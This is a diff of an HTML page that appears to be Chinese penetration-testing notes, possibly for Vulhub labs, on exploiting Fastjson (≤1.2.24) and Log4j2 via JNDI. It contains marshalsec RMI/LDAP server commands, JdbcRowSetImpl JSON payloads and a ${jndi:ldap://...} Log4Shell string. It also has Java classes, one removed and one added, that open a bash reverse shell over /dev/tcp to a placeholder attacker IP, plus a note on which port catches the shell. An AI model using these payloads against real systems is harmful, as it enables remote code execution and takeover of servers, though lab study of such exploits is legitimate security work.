@@ -325,7 +325,7 @@
     
     
       <span class="dot"></span>
-      <span>2.5k words</span>
+      <span>2.6k words</span>
     
   </div>
   
@@ -586,14 +586,14 @@ run  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
 <p>通过 <code>javac TouchFile.java</code> 将 <strong>.java</strong>代码 编译成 <strong>.class</strong>类，并在类所在文件夹搭建http服务 <code>python3 -m http.server &lt;http端口&gt;</code> 或 <code>python -m SimpleHTTPServer &lt;http端口&gt;</code> 。  </p>
 </blockquote>
 <h4 id="u5F00_u542FRMI_u670D_u52A1"><a href="#u5F00_u542FRMI_u670D_u52A1" class="headerlink" title="开启RMI服务"></a>开启RMI服务</h4><blockquote>
-<p>在marshalsec目录，执行命令，开启RMI服务，映射&lt;http端口&gt;为&lt;监听端口&gt;，并制定加载远程类 &lt;类名&gt;.class<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="token string">"http://&lt;攻击机ip>:&lt;http端口>/#&lt;类名>"</span> <span class="token operator">&lt;</span>监听端口<span class="token operator">></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>在marshalsec目录，执行命令，开启RMI服务，映射&lt;http端口&gt;为&lt;rmi服务监听端口&gt;，并制定加载远程类 &lt;类名&gt;.class<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="token string">"http://&lt;攻击机ip>:&lt;http端口>/#&lt;类名>"</span> <span class="token operator">&lt;</span>rmi服务监听端口<span class="token operator">></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 </blockquote>
 <h4 id="POST_json_u5BF9_u8C61"><a href="#POST_json_u5BF9_u8C61" class="headerlink" title="POST json对象"></a>POST json对象</h4><blockquote>
 <p>构建Payload，将自定义json对象POST至目标服务器<br><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// Fastjson &lt;= 1.2.24  </span>
 <span class="token punctuation">&#123;</span>
    <span class="token string">"b"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
-       <span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://&lt;攻击机ip>:&lt;监听端口>/&lt;类名>"</span><span class="token punctuation">,</span>
+       <span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://&lt;攻击机ip>:&lt;rmi服务监听端口>/&lt;类名>"</span><span class="token punctuation">,</span>
        <span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
@@ -605,37 +605,47 @@ run  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token string">"b"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
-       <span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://&lt;攻击机ip>:&lt;监听端口>/&lt;类名>"</span><span class="token punctuation">,</span>
+       <span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://&lt;攻击机ip>:&lt;rmi服务监听端口>/&lt;类名>"</span><span class="token punctuation">,</span>
        <span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 </blockquote>
 <h3 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h3><h4 id="u53CD_u5E8F_u5217_u5316_u4EE3_u7801-1"><a href="#u53CD_u5E8F_u5217_u5316_u4EE3_u7801-1" class="headerlink" title="反序列化代码"></a>反序列化代码</h4><blockquote>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//javac Exploit.java</span>
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">&#123;</span>
-  <span class="token keyword">public</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-      <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
-          <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/&lt;攻击机ip>/&lt;监听端口>;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-          <span class="token class-name">Process</span> pc <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
-          pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-          e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
- <span class="token punctuation">&#125;</span>
-  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-      <span class="token class-name">Exploit</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
- <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//javac Log4j2.java</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStreamReader</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Runtime</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Process</span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4j2</span><span class="token punctuation">&#123;</span>
+   <span class="token keyword">public</span> <span class="token class-name">Log4j2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+       <span class="token comment">//创建一个进程的实例</span>
+       <span class="token class-name">Process</span> p <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"bash -i >&amp; /dev/tcp/&lt;攻击机ip>/&lt;类端口> 0>&amp;1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token class-name">InputStream</span> is <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输入流</span>
+       <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输入流缓冲区</span>
+       <span class="token class-name">String</span> line<span class="token punctuation">;</span>
+       <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//循环读取缓冲区中的数据</span>
+           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出获取 的数据</span>
+       <span class="token punctuation">&#125;</span>
+       p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//waitFor：返回该Process对象代表的进程的出口值，值0表示正常退出，非0非正常。</span>
+       is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+       reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       p<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//destroy：杀掉该Process对象代表的进程。</span>
+   <span class="token punctuation">&#125;</span>
+   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+   <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </blockquote>
 <h4 id="u5F00_u542FLDAP_u670D_u52A1"><a href="#u5F00_u542FLDAP_u670D_u52A1" class="headerlink" title="开启LDAP服务"></a>开启LDAP服务</h4><blockquote>
-<p>在marshalsec目录，执行命令，开启LDAP服务，映射&lt;http端口&gt;为&lt;监听端口&gt;，并制定加载远程类 &lt;类名&gt;.class<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://&lt;攻击机ip>:&lt;http端口>/#&lt;类名>"</span> <span class="token operator">&lt;</span>监听端口<span class="token operator">></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>在marshalsec目录，执行命令，开启LDAP服务，映射&lt;http端口&gt;为&lt;ldap监听端口&gt;，并制定加载远程类 &lt;类名&gt;.class<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://&lt;攻击机ip>:&lt;http端口>/#&lt;类名>"</span> <span class="token operator">&lt;</span>ldap监听端口<span class="token operator">></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 </blockquote>
 <h4 id="POST_json_u5BF9_u8C61-1"><a href="#POST_json_u5BF9_u8C61-1" class="headerlink" title="POST json对象"></a>POST json对象</h4><blockquote>
-<p>构建Payload，将自定义json对象POST至目标服务器<br><pre class="line-numbers language-java" data-language="java"><code class="language-java">u<span class="token operator">=</span>$<span class="token punctuation">&#123;</span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">&lt;</span>攻击机ip<span class="token operator">></span><span class="token operator">:</span><span class="token operator">&lt;</span>监听端口<span class="token operator">></span><span class="token operator">/</span><span class="token operator">&lt;</span>类名<span class="token operator">></span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>构建Payload，将自定义json对象POST至目标服务器<br><pre class="line-numbers language-java" data-language="java"><code class="language-java">u<span class="token operator">=</span>$<span class="token punctuation">&#123;</span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">&lt;</span>攻击机ip<span class="token operator">></span><span class="token operator">:</span><span class="token operator">&lt;</span>ldap监听端口<span class="token operator">></span><span class="token operator">/</span><span class="token operator">&lt;</span>类名<span class="token operator">></span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 </blockquote>
 <h3 id="u6CE8_u610F"><a href="#u6CE8_u610F" class="headerlink" title="注意"></a>注意</h3><blockquote>
 <ul>
 <li>POST请求中需要规定 <code>Content-Type: application/json</code>  </li>
+<li>区分<code>类端口</code> 和 <code>服务端口</code>。<strong>类端口：监听拿shell</strong>，<strong>服务端口：构造payload</strong>。</li>
 </ul>
 </blockquote>
 <h2 id="u626B_u76EE_u5F55"><a href="#u626B_u76EE_u5F55" class="headerlink" title="扫目录"></a>扫目录</h2><blockquote>
@@ -969,7 +979,7 @@ nikto -h <span class="token number">192.168</span>.228.131  <span aria-hidden="t
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-03-07</div>
+        <div class="recent-posts-item-title">2022-03-14</div>
         <a href="/44cd77ef.html"><div class="recent-posts-item-content">Vulhub|PostgreSQL集合</div></a>
       </div>
     
